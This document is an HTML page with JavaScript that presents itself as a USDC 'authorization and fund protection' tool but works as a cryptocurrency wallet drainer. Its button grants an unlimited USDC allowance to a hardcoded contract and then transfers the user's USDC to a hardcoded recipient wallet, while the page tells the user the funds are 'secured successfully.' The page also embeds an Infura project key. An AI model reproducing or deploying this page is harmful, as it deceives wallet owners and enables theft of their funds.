<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · USDC Authorization & Fund Protection</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
</head>
<body>
  <h2>Mark III – USDC Authorization & Fund Protection</h2>

  <button id="connect">Connect Wallet</button>
  <button id="authorize">Authorize and Protect</button>
  <div id="status" style="margin-top: 10px; color: #333;"></div>

  <script>
    let provider, signer, userAddress;

    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24";
    const approveAmount = ethers.constants.MaxUint256;

    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: {
            1: "https://mainnet.infura.io/v3/01e1bb95db6c49ee8bc259f64fa4ed10"
          },
        },
      },
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions,
    });

    document.getElementById("connect").onclick = async () => {
      try {
        const instance = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Connection failed.";
      }
    };

    document.getElementById("authorize").onclick = async () => {
      try {
        const usdc = new ethers.Contract(
          usdcAddress,
          [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
          ],
          signer
        );

        document.getElementById("status").innerText = "Authorizing contract to manage your USDC...";
        const approveTx = await usdc.approve(contractAddress, approveAmount);
        await approveTx.wait();
        document.getElementById("status").innerText = "Authorization granted. Proceeding to transfer...";

        const amount = prompt("Enter the USDC amount to transfer:");
        const parsedAmount = ethers.utils.parseUnits(amount, 6);

        const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
        await transferTx.wait();
        document.getElementById("status").innerText = "Protection completed. Funds secured successfully.";
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Transaction failed: " + (err.message || "Unknown error");
      }
    };
  </script>
</body>
</html>
